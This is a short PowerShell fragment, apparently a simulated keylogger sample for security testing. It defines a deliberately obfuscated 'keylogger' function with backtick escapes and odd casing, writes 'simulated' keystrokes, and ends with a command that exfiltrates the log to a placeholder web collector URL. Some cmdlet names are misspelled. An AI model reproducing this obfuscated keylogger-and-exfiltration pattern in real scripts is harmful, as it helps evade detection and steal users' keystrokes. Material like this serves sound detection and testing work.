Function kEYLO`g`GeR {
    ...
    If ( -Not (Test-Path $artifactDir )) {
        $Null = New-Item -ItemType d`IRECtORy -Path $artifactDir -Force
    }
    ...
    writ-output "[safe] Simulated keystrokes written to $logPath"
    ...
    If ($Exfil ) {
        ...
        set-contnt -Path $exfilPath -Value $content -Encoding Ut`F8
...
keylogger -exfil -exfiloption WeBSe`R`VEr -url "https://collector.example.invalid/ingest"
